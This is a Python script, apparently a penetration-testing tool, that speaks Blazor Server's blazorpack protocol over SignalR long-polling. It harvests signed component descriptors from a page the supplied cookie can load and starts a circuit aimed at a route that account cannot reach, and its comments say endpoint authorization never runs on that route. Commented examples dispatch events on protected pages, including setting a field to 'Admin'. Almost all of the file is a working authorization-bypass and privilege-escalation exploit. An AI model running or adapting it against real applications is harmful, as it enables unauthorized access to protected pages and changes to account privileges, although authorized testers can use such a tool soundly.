#!/usr/bin/env python3
import json, re, time
import requests, msgpack

# ------------------------------- CONFIG --------------------------------
BASE    = "https://target.example.com"
PATH    = "/test"        # route you want, reachable or not
HARVEST = "/"                      # any page THIS cookie can load
COOKIE  = "PASTE_COOKIE_HERE"      # the only knob. "" = anonymous.
#                                    which account this belongs to IS the test.
# ----------------------------------------------------------------------

RS = b"\x1e"


# --------------------------- blazorpack framing -------------------------
def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def read_varint(buf, i):
    val = shift = 0
    while i < len(buf):
        b = buf[i]
        i += 1
        val |= (b & 0x7F) << shift
        if not b & 0x80:
            return val, i
        shift += 7
    raise ValueError("truncated varint")


def frame(obj):
    p = msgpack.packb(obj, use_bin_type=True)
    return varint(len(p)) + p


def iter_frames(buf, expect_text=False):
    """Drain complete frames from buf (a bytearray, mutated in place).

    A partial trailing frame is LEFT in the buffer for the next poll -- long
    poll responses split large render batches, so this must be stateful or the
    stream desyncs and the length prefix lands mid-payload.

    Returns a list of ("text", bytes) for 0x1E-delimited records (the handshake
    response) and ("msg", obj) for blazorpack frames.
    """
    out, i = [], 0
    while i < len(buf):
        # Only the handshake response is text-framed. Do NOT sniff for '{'
        # afterwards: a 123-byte blazorpack frame has 0x7B as its length prefix.
        if expect_text:
            k = buf.find(RS, i)
            if k == -1:
                break                           # incomplete
            out.append(("text", bytes(buf[i:k])))
            i = k + 1
            expect_text = False
            continue
        try:
            ln, j = read_varint(buf, i)
        except ValueError:
            break                                # partial varint
        if j + ln > len(buf):
            break                                # partial payload
        chunk = bytes(buf[j:j + ln])
        try:
            obj = msgpack.unpackb(chunk, raw=False, strict_map_key=False)
        except msgpack.ExtraData as e:
            obj = e.unpacked                     # tolerate a long prefix
        except Exception as e:
            print(f"[!] unpack failed at {i} (len {ln}): {e}")
            print(f"    {chunk[:48].hex()}")
            i = j + ln
            continue
        out.append(("msg", obj))
        i = j + ln
    del buf[:i]
    return out


def strings(data, minlen=4):
    """Render batches keep their string table as literal UTF-8 -- enough to
    confirm a finding without decoding the diff format."""
    out, cur = [], bytearray()
    for b in data:
        if 0x20 <= b < 0x7F:
            cur.append(b)
        else:
            if len(cur) >= minlen:
                out.append(cur.decode())
            cur = bytearray()
    if len(cur) >= minlen:
        out.append(cur.decode())
    return out


# ------------------------------ recon ----------------------------------
def harvest(base, cookie, path):
    """Pull the DP-signed component descriptors + persisted state from page HTML.
    Descriptors cannot be forged, but a plain GET hands them to you."""
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    if cookie:
        s.headers["Cookie"] = cookie        # falsy -> anonymous
    r = s.get(base.rstrip("/") + path, allow_redirects=False)
    marks = [json.loads(m) for m in re.findall(r"<!--Blazor:(\{.*?\})-->", r.text, re.S)]
    state = re.findall(r"<!--Blazor-Component-State:([A-Za-z0-9+/=]+)-->", r.text)
    print(f"[recon] HTTP {r.status_code}  {len(r.text)} bytes  "
          f"{len(marks)} marker(s)  state={bool(state)}")
    for m in marks:
        print(f"[recon]   {m.get('type')} seq={m.get('sequence')} "
              f"descriptor={str(m.get('descriptor'))[:40]}...")
    if state:
        import base64
        try:
            blob = base64.b64decode(state[0])
            print(f"[recon] persisted state {len(blob)} bytes -> {strings(blob)[:12]}")
        except Exception as e:
            print(f"[recon] state decode failed: {e}")
    return r, marks, state


def probe(cookie, paths):
    """Which routes hand THIS account usable descriptors? Pick a harvest page."""
    s = requests.Session()
    s.headers.update({"Cookie": cookie, "User-Agent": "Mozilla/5.0"})
    print("[probe] status / markers per path")
    for p in paths:
        try:
            r = s.get(BASE.rstrip("/") + p, allow_redirects=False, timeout=15)
        except Exception as e:
            print(f"  {p:<28} ERR {e}")
            continue
        n = len(re.findall(r"<!--Blazor:(\{.*?\})-->", r.text, re.S))
        flag = "  <= usable as HARVEST" if n else ""
        print(f"  {p:<28} {r.status_code}  markers={n}{flag}")


# ------------------------------ circuit ---------------------------------
class Circuit:
    def __init__(self, base, cookie):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.s.headers["User-Agent"] = "Mozilla/5.0"
        if cookie:
            self.s.headers["Cookie"] = cookie   # falsy -> anonymous
        self.token = None
        self.circuit_id = None
        self.alive = False
        self.next_id = 1
        self.batches = []
        self.rx = bytearray()       # survives across polls -- see iter_frames
        self.last_ping = time.time()
        self.handshook = False
        self.target_uri = self.base + "/"   # set by start_circuit
        # Under a reverse proxy the proxy's read timeout (often 60s) fires before
        # SignalR's PollTimeout (~90s) and you get a 504. Stay under the proxy.
        self.poll_timeout = 50
        self.quiet = 0              # consecutive empty/timed-out polls
        self.acked = []             # batch ids we have acknowledged
        self.verbose = True

    # ---- transport ----
    def negotiate(self):
        r = self.s.post(f"{self.base}/_blazor/negotiate?negotiateVersion=1")
        r.raise_for_status()
        j = r.json()
        self.token = j.get("connectionToken") or j["connectionId"]
        print(f"[+] token {self.token[:28]}...")
        return j

    def send(self, data):
        try:
            r = self.s.post(f"{self.base}/_blazor?id={self.token}", data=data,
                            headers={"Content-Type": "application/octet-stream"},
                            timeout=30)
        except requests.exceptions.RequestException as e:
            self.alive = False
            raise RuntimeError(f"send failed: {e}") from None
        if r.status_code not in (200, 202):
            self.alive = False
            raise RuntimeError(f"send {r.status_code}: {r.text[:200]}")

    def poll(self, timeout=None):
        """An idle long poll is held open by the server for ~90s (SignalR's
        PollTimeout) before returning empty. Our timeout must exceed that, and
        a read timeout is normal quiet -- not an error."""
        try:
            r = self.s.get(f"{self.base}/_blazor?id={self.token}"
                           f"&_={int(time.time() * 1000)}",
                           timeout=timeout or self.poll_timeout)
        except requests.exceptions.ReadTimeout:
            self.quiet += 1
            return b""
        except requests.exceptions.RequestException as e:
            print(f"[!] poll failed: {e}")
            self.alive = False
            return b""
        if r.status_code == 204:
            print("[x] server closed the connection (204)")
            self.alive = False
            return b""
        if r.status_code in (502, 503, 504):
            # Proxy timeout on an idle poll. The circuit is usually still alive
            # server side -- re-poll rather than giving up.
            print(f"[~] proxy {r.status_code} on idle poll; re-polling")
            self.quiet += 1
            return b""
        if r.status_code in (404, 410):
            print(f"[x] connection gone (HTTP {r.status_code}) -- circuit expired")
            self.alive = False
            return b""
        if r.status_code != 200:
            print(f"[!] poll HTTP {r.status_code}: {r.text[:200]}")
            self.alive = False
            return b""
        if not r.content:
            self.quiet += 1
        return r.content

    def handshake(self):
        self.send(json.dumps({"protocol": "blazorpack", "version": 1}).encode() + RS)
        self.alive = True                   # provisional; handle() confirms
        self.handle(self.poll())
        if not self.alive:
            raise RuntimeError("handshake rejected")

    # ---- hub calls ----
    def invoke(self, target, *args, blocking=True):
        iid = str(self.next_id); self.next_id += 1
        self.send(frame([1, {}, iid if blocking else None, target, list(args), []]))
        return iid

    def start_circuit(self, uri, descriptors, app_state="", raw_args=None):
        """raw_args: pass your BTP-decoded arg list verbatim if the signature
        differs -- it changed across .NET versions. Yours is authoritative."""
        self.target_uri = uri
        if raw_args is not None:
            return self.invoke("StartCircuit", *raw_args)
        return self.invoke("StartCircuit", self.base + "/", uri,
                           json.dumps(descriptors), app_state)

    def dispatch_event(self, handler_id, event_name="click",
                       field_value=None, component_id=None, event_args=None):
        desc = {"browserRendererId": 0,
                "eventHandlerId": handler_id,
                "eventName": event_name,
                "eventFieldInfo": ({"componentId": component_id,
                                    "fieldValue": field_value}
                                   if field_value is not None else None)}
        return self.invoke("DispatchBrowserEvent",
                           json.dumps(desc),
                           json.dumps(event_args or {"type": event_name}))

    def navigate(self, uri):
        return self.invoke("OnLocationChanged", uri, None, True, blocking=False)

    # ---- inbound ----
    def handle(self, raw):
        self.rx.extend(raw)
        for kind, payload in iter_frames(self.rx, expect_text=not self.handshook):
            if kind == "text":
                self.handshook = True
                try:
                    resp = json.loads(payload or b"{}")
                except Exception:
                    continue
                if resp.get("error"):
                    self.alive = False
                    print(f"[!] handshake rejected: {resp['error']}")
                else:
                    print("[+] handshake ok")
                continue

            m = payload
            if not isinstance(m, list) or not m:
                continue
            t = m[0]
            if t == 1:
                self.server_call(m[3], m[4] or [])
            elif t == 3:
                kind = m[3] if len(m) > 3 else None
                payload = m[4] if len(m) > 4 else None
                if kind == 1:
                    print(f"[!] hub error (id {m[2]}): {payload}")
                elif isinstance(payload, str) and len(payload) > 40:
                    self.circuit_id = payload
                    print(f"[+] circuitId {payload[:36]}...")
                else:
                    print(f"[ok] completion id={m[2]} {payload}")
            elif t == 7:
                self.alive = False
                print(f"[x] closed: {m[1:]}")

    def server_call(self, target, args):
        if target == "JS.RenderBatch":
            # Signature varies by version: (batchId, data) or
            # (browserRendererId, batchId, data). The id to ACK is the int
            # immediately before the payload -- acking the wrong one silently
            # stalls the circuit once MaxBufferedUnacknowledgedRenderBatches
            # (default 10) is reached.
            di = next((i for i, a in enumerate(args)
                       if isinstance(a, (bytes, bytearray))), None)
            data = bytes(args[di]) if di is not None else b""
            if di is not None and di > 0 and isinstance(args[di - 1], int):
                bid = args[di - 1]
            else:
                bid = next((a for a in args if isinstance(a, int)), None)

            self.batches.append((bid, data))
            if self.verbose:
                print(f"[batch] args={[type(a).__name__ for a in args]} "
                      f"ints={[a for a in args if isinstance(a, int)]} -> ack {bid}")
            print(f"\n=== batch {bid}  {len(data)} bytes ===")
            for s in strings(data):
                print("   ", s)
            if bid is not None:
                self.invoke("OnRenderCompleted", bid, None, blocking=False)
                self.acked.append(bid)

        elif target == "JS.BeginInvokeJS":
            handle, ident = args[0], args[1]
            known = {
                "Blazor._internal.navigationManager.getBaseURI": self.base + "/",
                "Blazor._internal.navigationManager.getLocationHref": self.target_uri,
                "Blazor._internal.navigationManager.getUnmarshalledBaseURI":
                    self.base + "/",
            }
            res = known.get(ident)
            if self.verbose:
                mark = "" if ident in known else "  <-- UNSTUBBED"
                print(f"[interop] handle={handle} {ident}{mark}")
            # handle 0 means fire-and-forget; the server expects no reply.
            if handle:
                self.invoke("EndInvokeJSFromDotNet", handle, True,
                            json.dumps([handle, True, res]), blocking=False)

        elif target in ("JS.AttachComponent", "JS.EndInvokeDotNet",
                        "JS.EndLocationChanging"):
            if self.verbose:
                print(f"[s->c] {target}")
        else:
            print(f"[s->c] {target} {str(args)[:160]}")

    def pump(self, seconds=30, quiet_limit=1):
        """Poll until `seconds` elapses, or until the circuit goes quiet after
        we have already seen at least one render batch."""
        end = time.time() + seconds
        had = len(self.batches)
        self.quiet = 0
        while self.alive and time.time() < end:
            if time.time() - self.last_ping > 12:
                try:
                    self.send(frame([6]))        # ping
                except RuntimeError as e:
                    print(f"[!] {e}")
                    break
                self.last_ping = time.time()
            t0 = time.time()
            raw = self.poll()
            if raw:
                self.handle(raw)
                self.quiet = 0
            elif self.quiet >= quiet_limit and len(self.batches) > had:
                break                            # rendered, then went quiet
            elif time.time() - t0 < 1.0:
                time.sleep(1.0)                  # never hot-loop a live target
        if self.rx:
            print(f"[i] {len(self.rx)} bytes buffered (partial frame pending)")
        if len(self.batches) == had:
            print("[i] no render batch arrived. Either StartCircuit was rejected,\n"
                  "    the route rendered nothing, or interop is still blocking.")


# ------------------------------- driver ---------------------------------
def run(cookie, label="run", harvest_path=None, target_uri=None,
        navigate_to=None, marks=None, seconds=20):
    """harvest_path : page whose descriptors we borrow -- must be reachable
       target_uri   : uri handed to StartCircuit -- need NOT be reachable
       navigate_to  : optional in-circuit OnLocationChanged once the circuit is up
       marks        : supply descriptors directly (e.g. harvested as another user)
    """
    harvest_path = PATH if harvest_path is None else harvest_path
    target_uri = target_uri or (BASE.rstrip("/") + harvest_path)
    print(f"\n{'=' * 64}\n  {label}\n{'=' * 64}")

    if marks is None:
        r, marks, _ = harvest(BASE, cookie, harvest_path)
        if not marks:
            print(f"[-] no descriptors from {harvest_path} (HTTP {r.status_code}).")
            print("    run probe() and set harvest_path= to a page this account loads.")
            return None

    c = Circuit(BASE, cookie)
    c.negotiate()
    c.handshake()
    print(f"[*] StartCircuit uri -> {target_uri}")
    c.start_circuit(target_uri, marks)
    c.pump(seconds)

    if navigate_to:
        print(f"\n[*] in-circuit OnLocationChanged -> {navigate_to}")
        c.navigate(navigate_to)
        c.pump(seconds)
    return c


if __name__ == "__main__":
    TARGET = BASE.rstrip("/") + PATH

    # 0. which pages does THIS cookie get descriptors from? pick one for HARVEST.
    # probe(COOKIE, ["/", "/dashboard", "/profile", "/home", PATH])

    # 1. borrow a descriptor from HARVEST, point the circuit at PATH.
    #    PATH is never requested over HTTP, so endpoint auth never runs.
    c = run(COOKIE, "borrowed descriptor", harvest_path=HARVEST, target_uri=TARGET)

    # 2. or arrive by in-circuit routing instead (different server code path)
    # c = run(COOKIE, "in-circuit nav", harvest_path=HARVEST, navigate_to=TARGET)

    # once a batch shows the table, fire row handlers:
    #   c.dispatch_event(47)                               # click
    #   c.dispatch_event(47, "change", field_value="Admin", component_id=5)
    #   c.pump(10)
